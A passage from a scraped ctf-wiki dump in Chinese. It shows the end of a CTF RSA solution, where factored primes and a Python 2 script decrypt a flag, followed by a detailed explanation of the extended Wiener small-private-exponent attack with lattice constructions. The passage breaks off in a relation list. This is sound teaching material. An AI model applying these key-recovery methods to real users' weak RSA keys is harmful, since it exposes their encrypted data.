mpz(404713159471231711408151571380906751680333129144247165378555186876078301457022630947986647887431519481527070603810696638453560506186951324208972060991323925955752760273325044674073649258563488270334557390141102174681693044992933206572452629140703447755138963985034199697200260653L))\n\n```\n\n接着利用 RsaConverter 以及 u，t，n 获取对应的 p 和 q。如下\n\n```shell\n94121F49C0E7A37A60FDE4D13F021675ED91032EB16CB070975A3EECECE8697ED161A27D86BCBC4F45AA6CDC128EB878802E0AD3B95B2961138C8CD04D28471B558CD816279BDCCF8FA1513A444AF364D8FDA8176A4E459B1B939EBEC6BB164F06CDDE9C203C612541E79E8B6C266436AB903209F5C63C8F0DA192F129F0272090CBE1A37E2615EF7DFBB05D8D88B9C964D5A42A7E0D6D0FF344303C4364C894AB7D912065ABC30815A3B8E0232D1B3D7F6B80ED7FE4B71C3477E4D6C2C78D733CF23C694C535DB172D2968483E63CC031DFC5B27792E2235C625EC0CFDE33FD3E53915357772975D264D24A7F31308D72E1BD7656B1C16F58372E7682660381\n8220863F1CFDA6EDE52C56B4036485DB53F57A4629F5727EDC4C5637603FE059EB44751FC49EC846C0B8B50966678DFFB1CFEB350EC44B57586A81D35E4887F1722367CE99116092463079A63E3F29D4F4BC416E7728B26248EE8CD2EFEA6925EC6F455DF966CEE13C808BC15CA2A6AAC7FEA69DB7C9EB9786B50EBD437D38B73D44F3687AEB5DF03B6F425CF3171B098AAC6708D534F4D3A9B3D43BAF70316812EF95FC7EBB7E224A7016D7692B52CB0958951BAB4FB5CB1ABB4DAC606F03FA15697CC3E9DF26DE5F6D6EC45A683CD5AAFD58D416969695067795A2CF7899F61669BC7543151AB700A593BF5A1E5C2AFBCE45A08A2A9CC1685FAF1F96B138D1\n```\n\n然后我们直接去获得 d，进而就可以恢复明文\n\n```python\n    p = 0x94121F49C0E7A37A60FDE4D13F021675ED91032EB16CB070975A3EECECE8697ED161A27D86BCBC4F45AA6CDC128EB878802E0AD3B95B2961138C8CD04D28471B558CD816279BDCCF8FA1513A444AF364D8FDA8176A4E459B1B939EBEC6BB164F06CDDE9C203C612541E79E8B6C266436AB903209F5C63C8F0DA192F129F0272090CBE1A37E2615EF7DFBB05D8D88B9C964D5A42A7E0D6D0FF344303C4364C894AB7D912065ABC30815A3B8E0232D1B3D7F6B80ED7FE4B71C3477E4D6C2C78D733CF23C694C535DB172D2968483E63CC031DFC5B27792E2235C625EC0CFDE33FD3E53915357772975D264D24A7F31308D72E1BD7656B1C16F58372E7682660381\n    q = 0x8220863F1CFDA6EDE52C56B4036485DB53F57A4629F5727EDC4C5637603FE059EB44751FC49EC846C0B8B50966678DFFB1CFEB350EC44B57586A81D35E4887F1722367CE99116092463079A63E3F29D4F4BC416E7728B26248EE8CD2EFEA6925EC6F455DF966CEE13C808BC15CA2A6AAC7FEA69DB7C9EB9786B50EBD437D38B73D44F3687AEB5DF03B6F425CF3171B098AAC6708D534F4D3A9B3D43BAF70316812EF95FC7EBB7E224A7016D7692B52CB0958951BAB4FB5CB1ABB4DAC606F03FA15697CC3E9DF26DE5F6D6EC45A683CD5AAFD58D416969695067795A2CF7899F61669BC7543151AB700A593BF5A1E5C2AFBCE45A08A2A9CC1685FAF1F96B138D1\n    if p * q == n:\n        print 'true'\n    phin = (p - 1) * (q - 1)\n    d = gmpy2.invert(e, phin)\n    cipher = 0x2517d1866acc5b7b802a51d6251673262e9e6b2d0e0e14a87b838c2751dee91e4ea29019b0a7877b849fddf9e08580d810622db538462b529412eba9d0f8a450fe1889021c0bbd12a62ccc3fff4627b1dbdebec3a356a066adc03f7650722a34fe41ea0a247cb480a12286fffc799d66b6631a220b8401f5f50daa12943856b35e59abf8457b2269efea14f1535fb95e56398fd5f3ac153e3ea1afd7b0bb5f02832883da46343404eb44594d04bbd254a9a35749af84eaf4e35ba1c5571d41cab4d58befa79b6745d8ecf93b64dd26056a6d1e82430afbff3dbc08d6c974364b57b30c8a8230c99f0ec3168ac4813c4205d9190481282ae14f7b94400caff3786ed35863b66fefcffbef1ad1652221746a5c8da083987b2b69689cf43e86a05ce4cf059934716c455a6410560e41149fbcf5fcea3c210120f106b8f6269b9a954139350626cf4dcb497ce86264e05565ec6c6581bf28c643bb4fab8677148c8034833cedacb32172b0ff21f363ca07de0fa2882ac896954251277adc0cdd0c3bd5a3f107dbebf5f4d884e43fe9b118bdd51dc80607608670507388ae129a71e0005826c7c82efccf9c86c96777d7d3b9b5cce425e3dcf9aec0643f003c851353e36809b9202ff3b79e8f33d40967c1d36f5d585ac9eba73611152fc6d3cf36fd9a60b4c621858ed1f6d4db86054c27828e22357fa3d7c71559d175ff8e8987df\n    flag = gmpy2.powmod(cipher, d, n)\n    print long_to_bytes(flag)\n```\n\n得到 flag\n\n```shell\ntrue\nhctf{d8e8fca2dc0f896fd7cb4cb0031ba249}\n```\n\n## 参考文献\n- http://cacr.uwaterloo.ca/hac/about/chap8.pdf\n", "timestamp": "2025-10-21T22:02:47.958669"}
{"source": "github", "repo": "ctf-wiki/ctf-wiki", "file": "docs/zh/docs/crypto/asymmetric/rsa/d_attacks/rsa_extending_wiener.md", "url": "https://github.com/ctf-wiki/ctf-wiki/blob/master/docs/zh/docs/crypto/asymmetric/rsa/d_attacks/rsa_extending_wiener.md", "content": "# 扩展维纳攻击\n\n* `扩展维纳攻击`来自[`《Extending Wiener's Attack in the Presence of Many Decrypting Exponents》`](https://www.sci-hub.ren/https://link.springer.com/chapter/10.1007/3-540-46701-7_14)，相关题目在CTF中已经出现了，例如2020羊城杯的Simple，但都是一些*模板题*，这里将详细分析原论文中提出的方法以及分析方式，写明扩展维纳攻击原理以及在文末给出了一些**开放问题**欢迎讨论。\n\n## 原理分析\n\n### 维纳（Wiener）的方法\n\n* 维纳`Wiener`提出了一种关于私钥过小时对$N$进行分解的一种方式。并给出了证明当\n\n    $$\n    d < \\frac{1}{3}N^{\\frac{1}{4}}\n    $$\n    \n    满足时(还应满足$q < p < 2q$，因这里及后文主要是对私钥进行探讨，故忽略这类条件)一定能够分解$N$。\n\n* 以下为原论文中对于`Wiener's Approach`的部分描述，部分内容有删减，其实这里也就是维纳攻击的证明，所以要想更详细了解请再看维纳攻击的原理，这里我们主要后面要用到这里的`式1`。方法如下\n\n    已知\n\n    $$\n    e*d -k*\\lambda(N) = 1\n    $$\n\n    这里$\\lambda(N) = lcm(p-1, q-1) = \\varphi(N) / g$，令$s = 1-p-q$则有\n\n    $$\n    edg - kN = g + ks\\tag{1}\n    $$\n\n    将两边同时除以$dgN$则有\n\n    $$\n    \\frac{e}{N} - \\frac{k}{dg} = \\frac{g+ks}{dgN} = (\\frac{k}{dg})(\\frac{s}{N}) + \\frac{1}{dN}\n    $$\n\n    我们知道这里有$e \\approx N, s \\approx N^{1/2}$，所以有$k/(dg)\\approx 1$。则我们可以知道等式右边约等于$N^{-1/2}$。我们都知道当\n\n    $$|x - a/b| < 1/(2b^2)$$\n\n    时则$a/b$是一个$x$连分数近似（`连分数定理Continued Fractions`）\n\n    所以当\n\n    $$d < \\frac{\\sqrt{2}}{2g}N^{\\frac{1}{4}}$$\n\n    时有$k/dg$是$e/N$的连分数近似，即能通过连分数展开覆盖。\n\n* 注意这里前面所说的范围和后面的范围并不矛盾\n\n    这里对一些参数的值的近似并不严格，所以和维纳攻击的严格范围有出入，具体细节可参考维纳攻击的证明。\n\n### 郭（Guo）的方法\n\n* 郭针对不止一个$e$的情况进行研究，但是郭只研究了两个以及三个$e$的情况，上上节一样，这里我们还是使用原文内容翻译+解释的写法。对于两个$e$的情况，我们可以考虑\n\n    $$\n    e_1d_1g - k_1(p-1)(q-1) = g\\\\\n    e_2d_2g - k_2(p-1)(q-1) = g\n    $$\n\n    简单化简可以得到下式子\n\n    $$\n    k_2d_1e_1 - k_1d_2e_2 = k_2 - k_1\\tag{2}\n    $$\n\n    两边同时除以$k_2d_1e_2$\n\n    $$\n    \\frac{e_1}{e_2} - \\frac{k_1d_2}{k_2d_1} = \\frac{k_2 - k_1}{k_2d_1e_2}\n    $$\n\n    设$d_i < N^\\alpha$，则等式右边约等于$N^{-(1+\\alpha)}$\n\n    则当\n\n    $$2(k_2d_1)^2 < N^{1+\\alpha}$$\n\n    时$k_1d_2/(k_2d_1)$是$e_1/e_2$的连分数近似。当$k_2$和$d_1$最多为$N^\\alpha$而且$g$很小时，得到\n\n    $$\\alpha < 1/3 - \\epsilon\\ \\ \\ (\\epsilon > 0)$$\n\n* 然而即使我们得到了$(k_1d_2)/(k_2d_1)$还是无法分解$N$，原文后面还讨论了郭的提议，尝试对$k_1d_2$进行分解，这里不再讲解。\n\n## 扩展维纳攻击\n\n* 上述部分内容截至目前（2021/10）网络上已经有很多博文进行了讲解了分析，但是对于具体扩展维纳攻击的原理以及格构造或者是更高维的推广都没有给出。这里我将详细的对原论文内容进行翻译以及讲解。\n\n* 为了将分析扩展到$n$个加密指数$e_i$（解密指数$d_i$很小），我们同时使用维纳和郭的方法，我们将关系\n\n    $$\n    d_ige_i - k_iN = g + k_is\n    $$\n\n    记为维纳等式$W_i$，同样我们可以得到关系\n\n    $$\n    k_id_je_j - k_jd_ie_i = k_i - k_j\n    $$\n\n    记为郭等式$G_{i,j}$。\n\n    我们假设$d_i$和$k_i$都小于$N^{\\alpha_n}$，且$g$很小，$s \\approx N^{1/2}$。可以注意到$W_i$和$G_i$的右侧非常小，实际上分别最多为$N^{1/2 + \\alpha}$和$N^\\alpha$。\n\n    最后，我们考虑复合关系式比如$W_uG_{v,w}$，显然大小为$N^{1/2 + 2\\alpha}$。\n\n* 原文中这里是定义了两个关系式以及指出了他们的大小范围，这个范围很重要也容容易分析处理，之后我们所做的其实就是使用这两个式子的不同复合关系去构造一个格，然后通过求其基向量得到$d_1g/k_1$，从而可以算得$\\varphi(N)$并可以进一步的对$N$进行分解。\n\n* 其实到这里原理分析已经结束，关于格的构造其实也并不复杂，但是核心是这里的复合关系的选取，以及对于最后$\\alpha$大小的分析。\n\n## 两个小解密指数的情况\n\n* 我们选取关系$W_1, G_{1,2},W_1W_2$,这样便有\n\n    $$\n    \\begin{aligned}\n        d_1ge_1 - k_1N &= g+k_1s\\\\\n        k_1d_2e_2 - k_2d_1e_1 &= k_1-k_2\\\\\n        d_1d_2g^2e_1e_2 - d_1gk_2e_1N - d_2gk_1e_2N + k_1k_2N^2 &= (g+k_1s)(g+k_2s)\n    \\end{aligned}\n    $$\n\n    我们对第一个关系式乘上$k_2$，这样左边便全是由$d_1d_2g^2, d_1gk_2, d_2gk_1$和$k_1k_2$构成，这样我们便可以用已知内容构造格将上述式子转化为矩阵运算\n\n    $$\n    \\begin{pmatrix}\n        k_1k_2&d_1gk_2&d_2gk_1&d_1d_2g^2\n    \\end{pmatrix} \\begin{pmatrix}\n        1&-N&0&N^2\\\\\n        &e_1&-e_1&-e_1N\\\\\n        &&e_2&-e_2N\\\\\n        &&&e_1e_2\n    \\end{pmatrix} = \\begin{pmatrix}\n        k_1k_2&k_2(g+k_1s)&g(k_1 - k_2)&(g+k_1s)(g+k_2s)\n    \\end{pmatrix}\n    $$\n\n    等式右边向量的大小为$N^{2\\alpha_2}, N^{1/2+2\\alpha_2}, N^{\\alpha_2}, N^{1+2\\alpha_2}$,为了让大小相等，我们可以考虑构造一个D矩阵。\n\n    $$\n    D = \\begin{pmatrix}\n        N&&&\\\\\n        &N^{1/2}&&\\\\\n        &&N^{1+\\alpha_2}&\\\\\n        &&&1\n    \\end{pmatrix}\n    $$\n\n    最终我们构造的矩阵为\n\n    $$\n    L_2 = \\begin{pmatrix}\n        1&-N&0&N^2\\\\\n        &e_1&-e_1&-e_1N\\\\\n        &&e_2&-e_2N\\\\\n        &&&e_1e_2\n    \\end{pmatrix} * D\n    $$\n\n    这样向量$b = \\begin{pmatrix} k_1k_2&d_1gk_2&d_2gk_1&d_1d_2g^2 \\end{pmatrix}$便有\n\n    $$\n    \\Vert bL_2 \t\\Vert < 2N^{1+2\\alpha_2}\n    $$\n\n    这也就是为什么前面需要构造$D$矩阵的原因，给定$D$矩阵后，我们可以得到一个上界，这样问题可以转化为类SVP问题。\n\n    那么这里的b向量其实我们使用格基规约算法例如`LLL`便可以得到基向量$b$，然后我们求解$b_2/b_1$即得到$d_1g/k_1$\n\n    之后我们就可以得到\n\n    $$\n    \\varphi(N) = \\frac{edg}{k} - \\frac{g}{k} = \\lfloor edg/k\\rceil\n    $$\n\n    我们假设这些格中最短向量长度为$\\Delta^{1/4-\\epsilon}$，其中$\\Delta = det(L_2) = N^{13/2 + \\alpha_2}$。如果这些格是随机的，我们甚至几乎可以肯定没有格点比闵可夫斯基界（Minkowski's bound）$2\\Delta^{1/4}$，所以$bL_2$是最短向量当\n\n    $$\n    N^{1+2\\alpha_2} < (1/c_2)\\left(N^{13/2+\\alpha_2}\\right)^{1/4}\n    $$\n\n    对于一些小的$c_2$，如果有\n\n    $$\n    \\alpha_2 < 5/14 - \\epsilon^{'}\n    $$\n\n    则我们可以通过格基规约找到向量$b$。\n\n* 上述内容是原文中给出的当两个小解密指数是进行的攻击细节，并且分析了$\\alpha$的大小关系。\n\n## 三个小解密指数的情况\n\n* 对于三个指数的情况我们额外选取$G_{1, 3}, W_1G_{2, 3}, W_2G_{1,3}$\n\n    这样我们的向量b为\n    \n    $$B = \\begin{pmatrix}\n        k_1k_2k_3&d_1gk_2k_3&k_1d_2gk_3&d_1d_2g^2k_3&k_1k_2d_3g&k_1d_3g&k_2d_3g&d_1d_2d_3g^3\n    \\end{pmatrix}$$\n\n    然后我们便可以构造格\n\n    $$\n    L_3 = \\left(\\begin{array}{rrrrrrrr}\n            1 & -N & 0 & N^{2} & 0 & 0 & 0 & -N^{3} \\\\\n            0 & e_{1} & -e_{1} & -N e_{1} & -e_{1} & 0 & N e_{1} & N^{2} e_{1} \\\\\n            0 & 0 & e_{2} & -N e_{2} & 0 & N e_{2} & 0 & N^{2} e_{2} \\\\\n            0 & 0 & 0 & e_{1} e_{2} & 0 & -e_{1} e_{2} & -e_{1} e_{2} & -N e_{1} e_{2} \\\\\n            0 & 0 & 0 & 0 & e_{3} & -N e_{3} & -N e_{3} & N^{2} e_{3} \\\\\n            0 & 0 & 0 & 0 & 0 & e_{1} e_{3} & 0 & -N e_{1} e_{3} \\\\\n            0 & 0 & 0 & 0 & 0 & 0 & e_{2} e_{3} & -N e_{2} e_{3} \\\\\n            0 & 0 & 0 & 0 & 0 & 0 & 0 & e_{1} e_{2} e_{3}\n            \\end{array}\\right)\n    $$\n\n    其中\n\n    $$\n    D = diag(\\begin{array}{r}\n        N^{\\frac{3}{2}}&N&N^{a + \\frac{3}{2}}&\\sqrt{N}&N^{a + \\frac{3}{2}}&N^{a + 1}&N^{a + 1}&1\\end{array})\n    $$\n\n    同样我们可以得到\n\n    $$\n    \\Vert bL_2 \t\\Vert < \\sqrt{8}N^{3/2+2\\alpha_3}\n    $$\n\n    则当\n\n    $$\\alpha_3 < 2/5 - \\epsilon^{'}$$\n\n    时可以通过格基规约求出向量$b$。\n\n## 四个小解密指数的情况\n\n* 额外选取$G_{1, 4}, W_1G_{2, 4}, G_{1, 2}G_{3,4}, G_{1, 3}G_{2, 4}, W_1W_2G_{3, 4}, W_1W_3G_{2, 4}, W_2W_3G_{1, 4}, W_1W_2W_3W_4$进行构造。不再翻译。\n\n## 分析\n\n* 扩展维纳攻击结合上述三个例子已经详细的阐明了方法细节，但是其中没有讲解如何选取复合关系。其实在原文的附录中给出了复合关系的选取，以及给出了$\\alpha_n$的表达式。\n\n* 在原文附录部分，考虑$n$个指数$e_i$，这样则有$2^n$个不同的量$h_j$（一个表达式$e_i$的个数），这样我们的$L_n$在乘上$D$之前，矩阵$L_n$的行列式为$N^{n2^{n-1}}$\n\n    这样最后一个关系$W_1W_2\\dots W_n$最大为$N^{n/2 + n\\alpha_n}$，这样我们便知道了任意情况的最大界值，我们只需要让其他值增加到这么多即可（即构造$D$矩阵）\n    \n    引入了新的关系式\n\n    $$\n    R_{u,v} = W_{i_1}\\dots W_{i_u}G_{j_1, l_1}\\dots G_{j_v, l_v}\n    $$\n\n    其中$i_1,\\dots,i_u,j_1,\\dots,j_u,l_1,\\dots,l_v$都不同，那么这里最多会有$u + 2v$个指数$e_i$，则我们的关系$R_{u,v}$最多为$N^{u/2 + (u+v)\\alpha_n}$，同时注意我要需要所有系数的大小大致相同，所以我们在某些等式乘上$k_i$，使得关系$R_{u, v} = N^{u/2 + (n-v)\\alpha_n}$。\n\n    最后我们再计算所有的大小与最大大小$N^{n/2 + n\\alpha_n}$的差值，构造矩阵$D$。\n\n    这样我们便完成了矩阵$D$的构造，同时设矩阵$D$里面指数的乘积为$\\beta_n = x+y\\alpha_n$，这样有\n\n    $$\n    det(L_n) \\approx N^{n2^{n-1} + x + y\\alpha_n}\n    $$\n\n    则有\n\n    $$\n    N^{n/2 + n\\alpha_n} < (1/c_n)\\left(N^{n2^{n-1} + x + y\\alpha_n}\\right)^{1/2^n}\n    $$\n\n    对于小$c_n$，有\n\n    $$\n    \\alpha_n < \\frac{x}{n2^n - y} - \\epsilon^{'}\n    $$\n\n    所以我们要想让$\\alpha_n$更大就需要让$x$和$y$更大，这意味着我们要选取更多的$v$和更小的$u$。比如在$n=2$的情况我们选取$W_1, G_{1, 2}, W_1W_2$而不是$W_1, W_2, W_1W_2$因为前者$\\beta_2 = 5/2 + \\alpha$而后者$\\beta_2 = 2$。\n\n* 到这里，其实已经讲清楚了扩展维纳攻击的整个流程，如何选择复合关系，如何构造格，如何构造矩阵$D$以及如何求解。在原文的文末也给出了$n\\le 5$时候的选择关系表。\n\n    ![选择关系表](figure/extendwiener-chosen-relations.png)\n\n    这里我也给出$n\\le8$的选择关系以及$n=6$时候构造的矩阵以供验证自己是否能够编写出选择关系式的逻辑代码。\n\n    ```txt\n    -\n    W(1)\n    G(1, 2)\n    W(1)W(2)\n    G(1, 3)\n    W(1)G(2, 3)\n    W(2)G(1, 3)\n    W(1)W(2)W(3)\n    G(1, 4)\n    W(1)G(2, 4)\n    G(1, 2)G(3, 4)\n    G(1, 3)G(2, 4)\n    W(1)W(2)G(3, 4)\n    W(1)W(3)G(2, 4)\n    W(2)W(3)G(1, 4)\n    W(1)W(2)W(3)W(4)\n    G(1, 5)\n    W(1)G(2, 5)\n    G(1, 2)G(3, 5)\n    G(1, 3)G(2, 5)\n    G(1, 4)G(2, 5)\n    W(1)W(2)G(3, 5)\n    W(1)G(2, 3)G(4, 5)\n    W(1)G(2, 4)G(3, 5)\n    W(2)G(1, 3)G(4, 5)\n    W(2)G(1, 4)G(3, 5)\n    W(3)G(1, 4)G(2, 5)\n    W(1)W(2)W(3)G(4, 5)\n    W(1)W(2)W(4)G(3, 5)\n    W(1)W(3)W(4)G(2, 5)\n    W(2)W(3)W(4)G(1, 5)\n    W(1)W(2)W(3)W(4)W(5)\n    G(1, 6)\n    W(1)G(2, 6)\n    G(1, 2)G(3, 6)\n    G(1, 3)G(2, 6)\n    G(1, 4)G(2, 6)\n    G(1, 5)G(2, 6)\n    W(1)W(2)G(3, 6)\n    W(1)G(2, 3)G(4, 6)\n    W(1)G(2, 4)G(3, 6)\n    W(1)G(2, 5)G(3, 6)\n    G(1, 2)W(3)G(4, 6)\n    G(1, 2)G(3, 4)G(5, 6)\n    G(1, 2)G(3, 5)G(4, 6)\n    G(1, 3)G(2, 4)G(5, 6)\n    G(1, 3)G(2, 5)G(4, 6)\n    G(1, 4)G(2, 5)G(3, 6)\n    W(1)W(2)W(3)G(4, 6)\n    W(1)W(2)G(3, 4)G(5, 6)\n    W(1)W(2)G(3, 5)G(4, 6)\n    W(1)W(3)G(2, 4)G(5, 6)\n    W(1)W(3)G(2, 5)G(4, 6)\n    W(1)W(4)G(2, 5)G(3, 6)\n    W(2)W(3)G(1, 4)G(5, 6)\n    W(2)W(3)G(1, 5)G(4, 6)\n    W(2)W(4)G(1, 5)G(3, 6)\n    W(3)W(4)G(1, 5)G(2, 6)\n    W(1)W(2)W(3)W(4)G(5, 6)\n    W(1)W(2)W(3)W(5)G(4, 6)\n    W(1)W(2)W(4)W(5)G(3, 6)\n    W(1)W(3)W(4)W(5)G(2, 6)\n    W(2)W(3)W(4)W(5)G(1, 6)\n    W(1)W(2)W(3)W(4)W(5)W(6)\n    G(1, 7)\n    W(1)G(2, 7)\n    G(1, 2)G(3, 7)\n    G(1, 3)G(2, 7)\n    G(1, 4)G(2, 7)\n    G(1, 5)G(2, 7)\n    G(1, 6)G(2, 7)\n    W(1)W(2)G(3, 7)\n    W(1)G(2, 3)G(4, 7)\n    W(1)G(2, 4)G(3, 7)\n    W(1)G(2, 5)G(3, 7)\n    W(1)G(2, 6)G(3, 7)\n    G(1, 2)W(3)G(4, 7)\n    G(1, 2)G(3, 4)G(5, 7)\n    G(1, 2)G(3, 5)G(4, 7)\n    G(1, 2)G(3, 6)G(4, 7)\n    G(1, 3)G(2, 4)G(5, 7)\n    G(1, 3)G(2, 5)G(4, 7)\n    G(1, 3)G(2, 6)G(4, 7)\n    G(1, 4)G(2, 5)G(3, 7)\n    G(1, 4)G(2, 6)G(3, 7)\n    G(1, 5)G(2, 6)G(3, 7)\n    W(1)W(2)W(3)G(4, 7)\n    W(1)W(2)G(3, 4)G(5, 7)\n    W(1)W(2)G(3, 5)G(4, 7)\n    W(1)W(2)G(3, 6)G(4, 7)\n    W(1)G(2, 3)W(4)G(5, 7)\n    W(1)G(2, 3)G(4, 5)G(6, 7)\n    W(1)G(2, 3)G(4, 6)G(5, 7)\n    W(1)G(2, 4)G(3, 5)G(6, 7)\n    W(1)G(2, 4)G(3, 6)G(5, 7)\n    W(1)G(2, 5)G(3, 6)G(4, 7)\n    W(2)G(1, 3)W(4)G(5, 7)\n    W(2)G(1, 3)G(4, 5)G(6, 7)\n    W(2)G(1, 3)G(4, 6)G(5, 7)\n    W(2)G(1, 4)G(3, 5)G(6, 7)\n    W(2)G(1, 4)G(3, 6)G(5, 7)\n    W(2)G(1, 5)G(3, 6)G(4, 7)\n    W(3)G(1, 4)G(2, 5)G(6, 7)\n    W(3)G(1, 4)G(2, 6)G(5, 7)\n    W(3)G(1, 5)G(2, 6)G(4, 7)\n    W(4)G(1, 5)G(2, 6)G(3, 7)\n    W(1)W(2)W(3)W(4)G(5, 7)\n    W(1)W(2)W(3)G(4, 5)G(6, 7)\n    W(1)W(2)W(3)G(4, 6)G(5, 7)\n    W(1)W(2)W(4)G(3, 5)G(6, 7)\n    W(1)W(2)W(4)G(3, 6)G(5, 7)\n    W(1)W(2)W(5)G(3, 6)G(4, 7)\n    W(1)W(3)W(4)G(2, 5)G(6, 7)\n    W(1)W(3)W(4)G(2, 6)G(5, 7)\n    W(1)W(3)W(5)G(2, 6)G(4, 7)\n    W(1)W(4)W(5)G(2, 6)G(3, 7)\n    W(2)W(3)W(4)G(1, 5)G(6, 7)\n    W(2)W(3)W(4)G(1, 6)G(5, 7)\n    W(2)W(3)W(5)G(1, 6)G(4, 7)\n    W(2)W(4)W(5)G(1, 6)G(3, 7)\n    W(3)W(4)W(5)G(1, 6)G(2, 7)\n    W(1)W(2)W(3)W(4)W(5)G(6, 7)\n    W(1)W(2)W(3)W(4)W(6)G(5, 7)\n    W(1)W(2)W(3)W(5)W(6)G(4, 7)\n    W(1)W(2)W(4)W(5)W(6)G(3, 7)\n    W(1)W(3)W(4)W(5)W(6)G(2, 7)\n    W(2)W(3)W(4)W(5)W(6)G(1, 7)\n    W(1)W(2)W(3)W(4)W(5)W(6)W(7)\n    G(1, 8)\n    W(1)G(2, 8)\n    G(1, 2)G(3, 8)\n    G(1, 3)G(2, 8)\n    G(1, 4)G(2, 8)\n    G(1, 5)G(2, 8)\n    G(1, 6)G(2, 8)\n    G(1, 7)G(2, 8)\n    W(1)W(2)G(3, 8)\n    W(1)G(2, 3)G(4, 8)\n    W(1)G(2, 4)G(3, 8)\n    W(1)G(2, 5)G(3, 8)\n    W(1)G(2, 6)G(3, 8)\n    W(1)G(2, 7)G(3, 8)\n    G(1, 2)W(3)G(4, 8)\n    G(1, 2)G(3, 4)G(5, 8)\n    G(1, 2)G(3, 5)G(4, 8)\n    G(1, 2)G(3, 6)G(4, 8)\n    G(1, 2)G(3, 7)G(4, 8)\n    G(1, 3)G(2, 4)G(5, 8)\n    G(1, 3)G(2, 5)G(4, 8)\n    G(1, 3)G(2, 6)G(4, 8)\n    G(1, 3)G(2, 7)G(4, 8)\n    G(1, 4)G(2, 5)G(3, 8)\n    G(1, 4)G(2, 6)G(3, 8)\n    G(1, 4)G(2, 7)G(3, 8)\n    G(1, 5)G(2, 6)G(3, 8)\n    G(1, 5)G(2, 7)G(3, 8)\n    G(1, 6)G(2, 7)G(3, 8)\n    W(1)W(2)W(3)G(4, 8)\n    W(1)W(2)G(3, 4)G(5, 8)\n    W(1)W(2)G(3, 5)G(4, 8)\n    W(1)W(2)G(3, 6)G(4, 8)\n    W(1)W(2)G(3, 7)G(4, 8)\n    W(1)G(2, 3)W(4)G(5, 8)\n    W(1)G(2, 3)G(4, 5)G(6, 8)\n    W(1)G(2, 3)G(4, 6)G(5, 8)\n    W(1)G(2, 3)G(4, 7)G(5, 8)\n    W(1)G(2, 4)G(3, 5)G(6, 8)\n    W(1)G(2, 4)G(3, 6)G(5, 8)\n    W(1)G(2, 4)G(3, 7)G(5, 8)\n    W(1)G(2, 5)G(3, 6)G(4, 8)\n    W(1)G(2, 5)G(3, 7)G(4, 8)\n    W(1)G(2, 6)G(3, 7)G(4, 8)\n    G(1, 2)W(3)W(4)G(5, 8)\n    G(1, 2)W(3)G(4, 5)G(6, 8)\n    G(1, 2)W(3)G(4, 6)G(5, 8)\n    G(1, 2)W(3)G(4, 7)G(5, 8)\n    G(1, 2)G(3, 4)W(5)G(6, 8)\n    G(1, 2)G(3, 4)G(5, 6)G(7, 8)\n    G(1, 2)G(3, 4)G(5, 7)G(6, 8)\n    G(1, 2)G(3, 5)G(4, 6)G(7, 8)\n    G(1, 2)G(3, 5)G(4, 7)G(6, 8)\n    G(1, 2)G(3, 6)G(4, 7)G(5, 8)\n    G(1, 3)G(2, 4)W(5)G(6, 8)\n    G(1, 3)G(2, 4)G(5, 6)G(7, 8)\n    G(1, 3)G(2, 4)G(5, 7)G(6, 8)\n    G(1, 3)G(2, 5)G(4, 6)G(7, 8)\n    G(1, 3)G(2, 5)G(4, 7)G(6, 8)\n    G(1, 3)G(2, 6)G(4, 7)G(5, 8)\n    G(1, 4)G(2, 5)G(3, 6)G(7, 8)\n    G(1, 4)G(2, 5)G(3, 7)G(6, 8)\n    G(1, 4)G(2, 6)G(3, 7)G(5, 8)\n    G(1, 5)G(2, 6)G(3, 7)G(4, 8)\n    W(1)W(2)W(3)W(4)G(5, 8)\n    W(1)W(2)W(3)G(4, 5)G(6, 8)\n    W(1)W(2)W(3)G(4, 6)G(5, 8)\n    W(1)W(2)W(3)G(4, 7)G(5, 8)\n    W(1)W(2)G(3, 4)W(5)G(6, 8)\n    W(1)W(2)G(3, 4)G(5, 6)G(7, 8)\n    W(1)W(2)G(3, 4)G(5, 7)G(6, 8)\n    W(1)W(2)G(3, 5)G(4, 6)G(7, 8)\n    W(1)W(2)G(3, 5)G(4, 7)G(6, 8)\n    W(1)W(2)G(3, 6)G(4, 7)G(5, 8)\n    W(1)W(3)G(2, 4)W(5)G(6, 8)\n    W(1)W(3)G(2, 4)G(5, 6)G(7, 8)\n    W(1)W(3)G(2, 4)G(5, 7)G(6, 8)\n    W(1)W(3)G(2, 5)G(4, 6)G(7, 8)\n    W(1)W(3)G(2, 5)G(4, 7)G(6, 8)\n    W(1)W(3)G(2, 6)G(4, 7)G(5, 8)\n    W(1)W(4)G(2, 5)G(3, 6)G(7, 8)\n    W(1)W(4)G(2, 5)G(3, 7)G(6, 8)\n    W(1)W(4)G(2, 6)G(3, 7)G(5, 8)\n    W(1)W(5)G(2, 6)G(3, 7)G(4, 8)\n    W(2)W(3)G(1, 4)W(5)G(6, 8)\n    W(2)W(3)G(1, 4)G(5, 6)G(7, 8)\n    W(2)W(3)G(1, 4)G(5, 7)G(6, 8)\n    W(2)W(3)G(1, 5)G(4, 6)G(7, 8)\n    W(2)W(3)G(1, 5)G(4, 7)G(6, 8)\n    W(2)W(3)G(1, 6)G(4, 7)G(5, 8)\n    W(2)W(4)G(1, 5)G(3, 6)G(7, 8)\n    W(2)W(4)G(1, 5)G(3, 7)G(6, 8)\n    W(2)W(4)G(1, 6)G(3, 7)G(5, 8)\n    W(2)W(5)G(1, 6)G(3, 7)G(4, 8)\n    W(3)W(4)G(1, 5)G(2, 6)G(7, 8)\n    W(3)W(4)G(1, 5)G(2, 7)G(6, 8)\n    W(3)W(4)G(1, 6)G(2, 7)G(5, 8)\n    W(3)W(5)G(1, 6)G(2, 7)G(4, 8)\n    W(4)W(5)G(1, 6)G(2, 7)G(3, 8)\n    W(1)W(2)W(3)W(4)W(5)G(6, 8)\n    W(1)W(2)W(3)W(4)G(5, 6)G(7, 8)\n    W(1)W(2)W(3)W(4)G(5, 7)G(6, 8)\n    W(1)W(2)W(3)W(5)G(4, 6)G(7, 8)\n    W(1)W(2)W(3)W(5)G(4, 7)G(6, 8)\n    W(1)W(2)W(3)W(6)G(4, 7)G(5, 8)\n    W(1)W(2)W(4)W(5)G(3, 6)G(7, 8)\n    W(1)W(2)W(4)W(5)G(3, 7)G(6, 8)\n    W(1)W(2)W(4)W(6)G(3, 7)G(5, 8)\n    W(1)W(2)W(5)W(6)G(3, 7)G(4, 8)\n    W(1)W(3)W(4)W(5)G(2, 6)G(7, 8)\n    W(1)W(3)W(4)W(5)G(2, 7)G(6, 8)\n    W(1)W(3)W(4)W(6)G(2, 7)G(5, 8)\n    W(1)W(3)W(5)W(6)G(2, 7)G(4, 8)\n    